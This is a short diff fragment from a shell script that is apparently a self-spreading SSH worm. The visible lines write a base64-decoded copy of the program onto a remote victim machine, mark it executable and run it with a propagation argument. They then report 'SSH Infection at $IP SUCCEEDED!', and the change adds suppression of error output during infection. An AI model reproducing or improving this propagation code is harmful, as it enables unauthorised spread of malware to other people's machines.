@@ -62,7 +62,7 @@ do
 			"echo \"$ENCODED\" | base64 -d > \$HOME/$NEW_NAME ; \
 			chmod +x \$HOME/$NEW_NAME ; \
 			sleep 10s ; \
-			./$NEW_NAME $VICTIM_PROPAGATION" # 2> /dev/null
+			./$NEW_NAME $VICTIM_PROPAGATION" 2> /dev/null
 
 		if [ $? -eq 0 ]; then
 		    echo "[ $MY_IP] SSH Infection at $IP SUCCEEDED!"
